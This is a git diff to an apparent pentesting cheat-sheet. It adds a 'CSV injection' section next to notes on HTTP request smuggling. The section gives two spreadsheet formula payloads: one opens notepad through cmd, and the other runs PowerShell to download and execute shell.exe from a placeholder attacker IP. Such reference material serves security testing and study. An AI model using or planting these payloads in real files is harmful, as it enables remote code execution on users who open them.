@@ -14,6 +14,9 @@
     - [TE.CL](#TE.CL)
     - [TE.TE](#TE.TE)
     
+- [CSV injection](#CSV_injection)
+   - [CSV injecton payloads](CSV_injecton_payloads)
+    
 - [Cross-origin resource sharing](#CORS)
    - []()
    - []()
@@ -159,6 +162,20 @@ Transfer-Encoding
 To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# CSV injection
+
+## CSV injection payloads
+
+- notepad
+```
+=cmd|'/C notepad'!'A0
+```
+
+- PowerShell
+```
+=cmd|'/C powershell IEX(wget <your_ip/shell.exe)'!A0
+```
+
 
 ## Nasted
 ```
